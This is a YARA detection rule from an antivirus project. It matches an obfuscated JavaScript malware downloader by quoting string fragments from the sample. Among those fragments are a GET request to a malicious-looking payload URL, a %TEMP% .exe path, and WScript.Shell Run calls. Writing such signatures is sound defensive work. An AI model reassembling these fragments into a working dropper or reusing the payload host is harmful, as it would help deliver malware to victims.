rule sig_20160328_1eabed7bfc5f43f7c6d4f3aba3b715ad {
  meta:
    description = "datamaliciousorder - file 20160328_1eabed7bfc5f43f7c6d4f3aba3b715ad.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5f6388619f977cb72a240be6e63fe201f969d65e06bc5781e94f2833d9180d07"

  strings:
    $s1  = "function Culyvzmq() {return Zwotikubto[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"gMoAY26xy9darYS.exe\";};" fullword ascii
    $s2  = "Mkyzcmdc[Oxzpypqx](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Rkysblef](Pljxx() * 11)} while (Mkyzcmdc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zwotikubto = function Sfzcbv() {return WScript[Lyzhwyam](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Xsducbgg(Aszawstz, Qilbnhy){return Aszawstz - Qilbnhy;};" fullword ascii
    $s6  = "function Ffggpjhtny(Vvnlydwrkh){Zwotikubto[\"Run\"](Vvnlydwrkh, Vjfiad, Vjfiad);};" fullword ascii
    $s7  = "function Dzjojy() {return ((Nrsklpj == true) && (Nrsklpj == Qffieaug)) ? 1 : Vjfiad;};" fullword ascii
    $s8  = "var Dkvovtuao = false;" fullword ascii
    $s9  = "function Pljxx(){return 22;};" fullword ascii
    $s10 = "Nrsklpj = true; " fullword ascii
    $s11 = "var Yujsomr = new this[\"Date\"]();" fullword ascii
    $s12 = "return Xsducbgg(Rtepqbvkv, Rnrledy);" fullword ascii
    $s13 = "var Qffieaug = false;" fullword ascii
    $s14 = "function Srfocx(){return Lyzhwyam;};" fullword ascii
    $s15 = "Qffieaug = true; " fullword ascii
    $s16 = "function Vobzhyqzxs(){return Ujmpwohy;};" fullword ascii
    $s17 = "var Nrsklpj = false;" fullword ascii
    $s18 = " while (Mxhecvhfy){" fullword ascii
    $s19 = "function Uweuftidq(Shupinl) {var Rlouqmdfz = (1, 2, 3, 4, 5, Shupinl); return Rlouqmdfz;};" fullword ascii
    $s20 = "function Vuepmcajq()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}